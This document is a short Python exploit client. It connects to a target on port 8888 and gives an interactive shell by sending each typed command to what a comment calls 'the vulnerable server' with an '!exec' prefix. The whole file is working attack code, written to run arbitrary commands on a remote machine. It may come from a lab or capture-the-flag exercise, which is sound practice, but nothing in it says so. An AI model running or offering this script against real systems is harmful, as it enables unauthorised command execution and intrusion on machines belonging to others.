import socket

# Target info
TARGET_IP = '' #add ip here
TARGET_PORT = 8888

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        print(f"[+] Connected to {TARGET_IP}:{TARGET_PORT}")
        return s
    except Exception as e:
        print(f"[!] Connection error: {e}")
        return None

def shell(s):
    try:
        while True:
            cmd = input("Shell> ")
            if cmd.lower() in ["exit", "quit"]:
                break
            if not cmd.strip():
                continue
            # Prefix with !exec for the vulnerable server to treat as a command
            s.sendall(f"!exec {cmd}\n".encode())
            response = s.recv(4096)
            print(response.decode(errors="ignore"), end="")
    except Exception as e:
        print(f"[!] Error during shell: {e}")
    finally:
        s.close()
        print("[-] Disconnected.")

if __name__ == "__main__":
    sock = connect()
    if sock:
        shell(sock)
